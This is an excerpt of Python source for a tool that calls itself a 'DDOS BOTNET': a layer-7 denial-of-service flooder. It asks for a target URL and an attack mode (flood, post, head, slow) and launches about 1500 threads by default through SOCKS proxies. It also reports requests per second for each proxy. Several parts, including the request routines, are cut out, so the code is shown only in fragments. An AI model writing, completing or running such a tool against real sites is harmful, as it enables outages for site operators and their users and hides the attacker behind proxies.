...
def banner():
    system("cls||clear")
    __banner__ = pyfiglet.figlet_format("DDOS BOTNET", font="slant", justify="center")
    print(red + __banner__)
    print(f"\t\t\t{green}[ {white}DDOS BOTNET {green}]")
    print(f"\t    {green}[ {white}A Tools DDOS Attack BotNet Support Layer 7 With Socket, Socks5 & Proxy Using Threads{green}]\n")
    ...
    if mode == "post":
        for _ in range(thread_num):
            th = threading.Thread(target=post, args=(
                event, socks_type, ind_rlock,))
            th.setDaemon(True)
            th.start()
    elif mode == "flood":
        for _ in range(thread_num):
            th = threading.Thread(target=flood, args=(
                event, socks_type, ind_rlock,))
            th.setDaemon(True)
            th.start()
    elif mode == "head":
        for _ in range(thread_num):
            th = threading.Thread(target=head, args=(
                event, socks_type, ind_rlock,))
            th.setDaemon(True)
            th.start()
...
def OutputToScreen(ind_rlock):
    ...
    while 1:
        if i > 3:
            i = 0
        print("{:^70}".format(f"Starting Attack To {url} |  With Threads : {thread_num}"))
        ind_rlock.acquire()
        top_num = 0
        ...
        for num in range(top_num):
            ...
            if len(ind_dict) != 0:
                ...
                ind_dict[top] = 0
            print("{:^70}".format(
                "{:2d}. {:^22s} | Rps: {:d}".format(num+1, top, rps)))
        total = 0
...
def flood(event, socks_type, ind_rlock):
    global ind_dict
...
def main():
    ...
    global thread_num
    banner()
    print("> Choose Your BotNet : [flood/post/head/slow/check]")
    mode = InputOption("> Choose Your BotNet (default=flood) : ", ["flood", "post", "head", "slow", "check"], "flood")
    url = str(input("> Input the Target Attack URL : ")).strip()
    ParseUrl(url)
    if mode == "post":
    ...
    choice = InputOption("> Choose your Socks5/Socks4 mode(4/5, default=5) : ", ["4", "5"], "5")
    if choice == "4":
        socks_type = 4
    else:
        socks_type = 5
    if mode == "check":
        ...
        return
    if mode == "slow":
        thread_num = str(input("> Input Connections You Want (default=1500) : "))
    else:
        thread_num = str(input("> Input Threads You Want (default=1500) : "))
    if thread_num == "":
        thread_num = int(1500)
    else:
        try:
    ...
    if mode == "slow":
        ...
        multiple = str(input("> Input the Magnification you want (default=500) : "))
        if multiple == "":
            multiple = int(500)
        else:
            multiple = int(multiple)
        brute = str(input("> Enable Boost BotNet mode[VIP] (y/n, default=Y) : "))
        if brute == "":
            brute = True
        elif brute == "y":
            brute = True
